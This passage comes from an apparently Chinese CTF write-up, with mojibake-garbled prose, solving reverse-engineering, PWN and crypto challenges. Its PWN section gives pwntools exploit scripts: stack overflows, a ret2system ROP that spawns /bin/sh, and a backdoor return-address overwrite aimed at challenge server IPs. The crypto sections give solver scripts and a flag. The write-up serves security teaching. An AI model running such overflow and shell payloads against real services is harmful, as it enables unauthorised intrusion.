v5);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(enc, Str2) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;yes!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>v5ä¸str2ç»è¿‡do_somethingåŠ å¯†åä¸ºå¯†æ–‡enc</p><p><img src="https://s2.loli.net/2023/08/04/1nLSWzQ7lTeuOv4.png" alt="image-20221021105716955.png"></p><p>å¾ˆæ˜æ˜¾çš„æ¢è¡¨base64åŠ å¯†ã€‚</p><p>å¯†æ–‡enc=â€™tLntq1rgE1vqwf8XC19Zmf8Zyxn5Fq==â€™é‚£ä¹ˆç»è¿‡æ¢è¡¨base64è§£è¿·2å°±æ˜¯flagäº†ã€‚</p><p>NSSCTF{UPX_1s_s0_3asy}</p><h2 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h2><p>æç¤ºè¦ç‚¹99999999ä¸‹æ‰èƒ½æ‹¿åˆ°flagï¼Œceæ‰¾åŸºå€ç„¶åæ”¹å†…å­˜å³å¯ã€‚</p><p><img src="https://s2.loli.net/2023/08/04/qungbR1waKZBMzQ.png" alt="image-20221021110552499.png"></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h2><p>Source</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Input something&quot;</span>);</span><br><span class="line">    <span class="type">char</span> name[<span class="number">30</span>];</span><br><span class="line">    <span class="type">int</span> number=<span class="number">0</span>;</span><br><span class="line">    gets(name);</span><br><span class="line">    <span class="keyword">if</span>(number!=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You win.&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getså­˜åœ¨æ ˆæº¢å‡ºï¼Œgdbä¸€ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°cmpæ˜¯æ‹¿[rbp - 4]å³0x8cçš„å€¼å’Œ0è¿›è¡Œæ¯”è¾ƒï¼Œé‚£ä¹ˆå¯ä»¥æ¨æ–­å‡ºnumberçš„å€¼å°±æ˜¯å­˜åœ¨è¿™ä¸ªåœ°å€é‡Œï¼Œæ ˆé¡¶rspä¸º0x60è·ç¦»0x8cæœ‰0x2cä¸ªå•ä½ï¼Œé‚£ä¹ˆå°±è¦å­˜å…¥0x2dä¸ª1å°±èƒ½è¦†ç›–numberçš„å€¼ã€‚å°±æ‹¿åˆ°flagäº†ã€‚</p><p><img src="https://s2.loli.net/2023/08/04/kEYbJ58wLDK2Pe1.png" alt="image-20221014112957850.png"></p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">sh = remote(<span class="string">&#x27;43.143.7.97&#x27;</span>,<span class="number">28048</span>)</span><br><span class="line">payload = <span class="string">b&#x27;1&#x27;</span>*(<span class="number">0x2d</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ezcmp"><a href="#ezcmp" class="headerlink" title="ezcmp"></a>ezcmp</h2><p>ç»™æºæ–‡ä»¶äº†ï¼ŒåŸºæœ¬é€»è¾‘å°±æ˜¯buffç»è¿‡enccryptoåŠ å¯†ã€‚æˆ‘ä»¬è¾“å…¥å¯†æ–‡å°±èƒ½å¾—åˆ°shellã€‚</p><p><img src="https://s2.loli.net/2023/08/04/Es45f62SiXdo1Cw.png" alt="image-20221027104049616.png"></p><p>æºæ–‡ä»¶å·²ç»ç»™æˆ‘ä»¬äº†ï¼Œç›´æ¥å†™è„šæœ¬å³å¯ï¼Œæ³¨æ„è¦&amp;0xffå¾—åˆ°byteå½¢å¼çš„å¯†æ–‡ï¼ˆæœ‰ä¸å¯è§å­—ç¬¦ï¼‰ï¼Œè¦ä¸ç„¶æ‰“ä¸é€šã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> buff[<span class="number">100</span>];</span><br><span class="line"><span class="type">int</span> v0;</span><br><span class="line"><span class="type">char</span> buffff[] = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ1234&quot;</span>;</span><br><span class="line"><span class="type">char</span> bua[] = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz4321&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> *<span class="title">enccrypt</span><span class="params">(<span class="type">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">29</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        a = <span class="built_in">rand</span>();</span><br><span class="line">        buf[i] ^= buffff[i];</span><br><span class="line">        buff[i] ^= bua[i];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">29</span>; j &gt;= <span class="number">0</span>; j--)</span><br><span class="line">        &#123;</span><br><span class="line">            buf[j] = buff[i];</span><br><span class="line">            buf[i] += <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        buf[i] -= ((bua[i] ^ <span class="number">0x30</span>) * (buffff[i] &gt;&gt; <span class="number">2</span>) &amp; <span class="number">1</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">        buf[i] += (a % buff[i]) &amp; <span class="number">0xff</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[] = <span class="string">&quot;Ayaka_nbbbbbbbbbbbbbbbbb_pluss&quot;</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(buff, buf);</span><br><span class="line">    <span class="type">char</span> test[<span class="number">30</span>];</span><br><span class="line">    <span class="type">int</span> v0 = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">srand</span>(v0);</span><br><span class="line">    <span class="built_in">enccrypt</span>(buff);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%x,&quot;</span>, buff[i]&amp;<span class="number">0xff</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>windowså’Œlinuxå¹³å°è·‘å‡ºæ¥çš„ç»“æœä¸ä¸€æ ·ï¼Œç”¨gccç¼–è¯‘ã€‚</p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;43.143.7.97&#x27;</span>,<span class="number">28967</span>)</span><br><span class="line">playload = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">list</span> = [<span class="number">0x72</span>,<span class="number">0x40</span>,<span class="number">0xe</span>,<span class="number">0xdc</span>,<span class="number">0xaa</span>,<span class="number">0x78</span>,<span class="number">0x46</span>,<span class="number">0x14</span>,<span class="number">0xe2</span>,<span class="number">0xb0</span>,<span class="number">0x7e</span>,<span class="number">0x4c</span>,<span class="number">0x1a</span>,<span class="number">0xe8</span>,<span class="number">0xb6</span>,<span class="number">0x84</span>,<span class="number">0x52</span>,<span class="number">0x20</span>,<span class="number">0xee</span>,<span class="number">0xbc</span>,<span class="number">0x8a</span>,<span class="number">0x58</span>,<span class="number">0x26</span>,<span class="number">0xf4</span>,<span class="number">0xc2</span>,<span class="number">0x90</span>,<span class="number">0x5e</span>,<span class="number">0x2c</span>,<span class="number">0xcb</span>,<span class="number">0xc8</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    playload += <span class="built_in">chr</span>(i)</span><br><span class="line">p.sendline(playload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ezr0p32"><a href="#ezr0p32" class="headerlink" title="ezr0p32"></a>ezr0p32</h2><p><img src="https://s2.loli.net/2023/08/04/jLfoiKIrWtnyAgp.png" alt="image-20221027104820709.png"></p><p>æœ‰ä¸¤ä¸ªreadå‡½æ•°ï¼Œrop32ä¸éœ€è¦æ³„éœ²libcåœ°å€ï¼Œsystemå‡½æ•°åœ¨é¢˜ä¸­å·²ç»ç»™å‡ºï¼Œæˆ‘ä»¬åœ¨ç¬¬ä¸€ä¸ªreadå†™å…¥/bin/shå³å¯ã€‚</p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;43.143.7.97&#x27;</span>,<span class="number">28131</span>)</span><br><span class="line">system_addr = <span class="number">0x08048562</span></span><br><span class="line">bin_addr = <span class="number">0x0804A080</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;please tell me your name\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x1c</span> + <span class="number">0x4</span>) + p32(system_addr) + p32(bin_addr)</span><br><span class="line">p.recvuntil(<span class="string">&quot;now it&#x27;s your play time~\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ez-backdoor"><a href="#ez-backdoor" class="headerlink" title="ez_backdoor"></a>ez_backdoor</h2><p>ä¸»å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°vnlné‡Œé¢ï¼Œread(0, buf, 0x140uLL);å­˜åœ¨æº¢å‡ºã€‚è¦†ç›–è¿”å›åœ°å€å³å¯ã€‚</p><p><img src="https://s2.loli.net/2023/08/04/EsRMujK2F5nXlZP.png" alt="image-20221020145647559.png"></p><p>åé—¨å‡½æ•°çš„åœ°å€åœ¨0x4011d2ï¼Œæº¢å‡ºé‡ä¸º0x100ã€‚</p><p><img src="https://s2.loli.net/2023/08/04/dvQ9Meh5U4GtrzW.png" alt="image-20221020145810487.png"></p><p>exp.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&#x27;43.143.7.127&#x27;,28064)</span><br><span class="line">payload = b&#x27;a&#x27;*(0x100 + 0x8) + p64(0x4011d2)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="baBAbaseSEse"><a href="#baBAbaseSEse" class="headerlink" title="baBAbaseSEse"></a>baBAbaseSEse</h2><p>baseå¥—å¨ƒï¼Œbasecrcakä¸€æŠŠæ¢­ã€‚</p><p><img src="https://s2.loli.net/2023/08/04/biazNoIRK1LMvwp.png" alt="image-20221030103002488.png"></p><h2 id="A-dictator"><a href="#A-dictator" class="headerlink" title="A dictator"></a>A dictator</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">offset = randint(<span class="number">1</span>,<span class="number">100</span>) % <span class="number">26</span></span><br><span class="line"><span class="comment"># print(offset)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&#x27;NSSCTF&#123;&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>([<span class="built_in">ord</span>(c) <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> flag[<span class="number">7</span>:-<span class="number">1</span>]])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> flag[<span class="number">7</span>:-<span class="number">1</span>]:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= <span class="built_in">ord</span>(char) &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        index = <span class="built_in">ord</span>(char)-<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        new_char = <span class="built_in">chr</span>((index+offset)%<span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">        <span class="built_in">print</span>(new_char,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(char,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># lzw_uswksj_uahzwj_ak_gfw_gx_lzw_egkl_tskau_udskkausd_uahzwjk</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç»å…¸å‡¯æ’’ï¼Œæšä¸¾å³å¯ã€‚</p><h2 id="littleprince"><a href="#littleprince" class="headerlink" title="littleprince"></a>littleprince</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    <span class="keyword">return</span> a&gt;&gt;b|(a&amp;((<span class="number">1</span>&lt;&lt;b)-<span class="number">1</span>))&lt;&lt;(c-b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">outp</span>(<span class="params">x,h</span>):</span><br><span class="line">    p=randint(<span class="number">1</span>&lt;&lt;h,<span class="number">1</span>&lt;&lt;h+<span class="number">1</span>)</span><br><span class="line">    q=randint(<span class="number">1</span>&lt;&lt;h,<span class="number">1</span>&lt;&lt;h+<span class="number">1</span>)</span><br><span class="line">    c1,c2=x%p,x%q</span><br><span class="line">    <span class="built_in">print</span>(p,q,c1,c2)</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">m_len=m.bit_length()</span><br><span class="line">d,h,st=<span class="number">32</span>,<span class="number">16</span>,<span class="number">32</span></span><br><span class="line">r=m_len%d</span><br><span class="line"><span class="keyword">assert</span>(r&gt;h)</span><br><span class="line"><span class="keyword">while</span> st&lt;=m_len:</span><br><span class="line">    x=enc(m,st,m_len)</span><br><span class="line">    x&gt;&gt;=(m_len-d)</span><br><span class="line">    outp(x,h)</span><br><span class="line">    st+=d</span><br><span class="line">m&gt;&gt;=(m_len-r)</span><br><span class="line">outp(m,h)</span><br></pre></td></tr></table></figure><p>output</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">58831 56263 46164 34042</span><br><span class="line">55579 48157 2944 35950</span><br><span class="line">35507 38933 1938 2559</span><br><span class="line">63419 51803 24116 33843</span><br><span class="line">40423 47237 20923 43307</span><br><span class="line">33599 43441 4324 37076</span><br><span class="line">43541 40771 42833 32799</span><br><span class="line">54869 40031 21847 16617</span><br><span class="line">48953 34841 36031 3788</span><br><span class="line">34403 58271 12464 55665</span><br><span class="line">33457 61463 3512 47396</span><br><span class="line">53047 57283 185 38171</span><br><span class="line">52583 59281 45851 38603</span><br><span class="line">60727 58043 36261 37164</span><br></pre></td></tr></table></figure><p>ç»™äº†hint</p><p>hint:When we generate two numbers, there may be a coincidence that they are coprime.</p><p>æ±‚ä¸€ä¸‹å…¬çº¦æ•°,æ²¡æœ‰ã€‚ä¸­å›½å‰©ä½™å®šç†æ±‚ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CRT</span>(<span class="params">cipher, n</span>):</span><br><span class="line">    N = reduce(<span class="keyword">lambda</span> x, y: x * y, (i <span class="keyword">for</span> i <span class="keyword">in</span> n))</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    data = <span class="built_in">zip</span>(cipher, n)</span><br><span class="line">    <span class="keyword">for</span> ci, ni <span class="keyword">in</span> data:</span><br><span class="line">        Ni = N // ni</span><br><span class="line">        di = gmpy2.invert(Ni, ni)</span><br><span class="line">        result += ci * Ni * di</span><br><span class="line">    <span class="keyword">return</span> result % N, N</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.readlines()[::-<span class="number">1</span>]</span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">flag_bin=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> data:</span><br><span class="line">    c_list = []</span><br><span class="line">    n_list = []</span><br><span class="line">    tmp = t.strip(<span class="string">&quot;\n&quot;</span>).split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    c_list.append(<span class="built_in">int</span>(tmp[<span class="number">2</span>]))</span><br><span class="line">    c_list.append(<span class="built_in">int</span>(tmp[<span class="number">3</span>]))</span><br><span class="line">    n_list.append(<span class="built_in">int</span>(tmp[<span class="number">0</span>]))</span><br><span class="line">    n_list.append(<span class="built_in">int</span>(tmp[<span class="number">1</span>]))</span><br><span class="line">    x, N = CRT(c_list, n_list)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">int</span>(x),long_to_bytes(<span class="built_in">int</span>(x)))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(x) &lt;<span class="number">618357700</span>:</span><br><span class="line">        flag += long_to_bytes(<span class="built_in">int</span>(x) + <span class="built_in">int</span>(tmp[<span class="number">0</span>])*<span class="built_in">int</span>(tmp[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += long_to_bytes(<span class="built_in">int</span>(x))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="XXXOOORRR"><a href="#XXXOOORRR" class="headerlink" title="XXXOOORRR"></a>XXXOOORRR</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">randBytes = [bytes_to_long(os.urandom(<span class="number">64</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;a = <span class="subst">&#123;randBytes[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;b = <span class="subst">&#123;randBytes[<span class="number">0</span>] ^ randBytes[<span class="number">1</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;randBytes[<span class="number">1</span>] ^ randBytes[<span class="number">2</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;d = <span class="subst">&#123;m ^ randBytes[<span class="number">0</span>] ^ randBytes[<span class="number">1</span>] ^ randBytes[<span class="number">2</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">a = 1215421974111272707828609697064234072332368362928440865251897449605952163161176359366553487776268706107760670434157083936287598207881176904763353849369234</span></span><br><span class="line"><span class="string">b = 10533604054267448009117468094542127075826310122733511023911022436253583775790861879410728001403728088545946257902341417532648419689212361977221573357292618</span></span><br><span class="line"><span class="string">c = 6401236597601556248960570084212025183497657335932789785351897915858852832577623776212842429736547820800219382515052263929074210010546149322465536545021479</span></span><br><span class="line"><span class="string">d = 5711309307698496426409561761492698639489294806611133698231840146911562848869711567477706456972659368849642409039245400981517493100724067475248620536111560</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>ä¸€é“å¼‚æˆ–é¢˜ï¼Œd^c^aå°±æ˜¯flagã€‚</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">a = <span class="number">1215421974111272707828609697064234072332368362928440865251897449605952163161176359366553487776268706107760670434157083936287598207881176904763353849369234</span></span><br><span class="line">b = <span class="number">10533604054267448009117468094542127075826310122733511023911022436253583775790861879410728001403728088545946257902341417532648419689212361977221573357292618</span></span><br><span class="line">c = <span class="number">6401236597601556248960570084212025183497657335932789785351897915858852832577623776212842429736547820800219382515052263929074210010546149322465536545021479</span></span><br><span class="line">d = <span class="number">5711309307698496426409561761492698639489294806611133698231840146911562848869711567477706456972659368849642409039245400981517493100724067475248620536111560</span></span><br><span class="line">m = d^c^a</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h2 id="baby-rsa"><a href="#baby-rsa" class="headerlink" title="baby_rsa"></a>baby_rsa</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line">q = getPrime(<span class="number">128</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(n,c)</span><br><span class="line"><span class="comment"># 62193160459999883112594854240161159254035770172137079047232757011759606702281</span></span><br><span class="line"><span class="comment"># 17331436837911040930486942133359735652484926528331507431552667656734821231501</span></span><br></pre></td></tr></table></figure><p>nå¯ä»¥ç›´æ¥ç”¨factoråˆ†è§£å‡ºpï¼Œq,ç„¶åä¸€æŠŠæ¢­å°±è¡Œã€‚</p><p>exp.py</p><figure 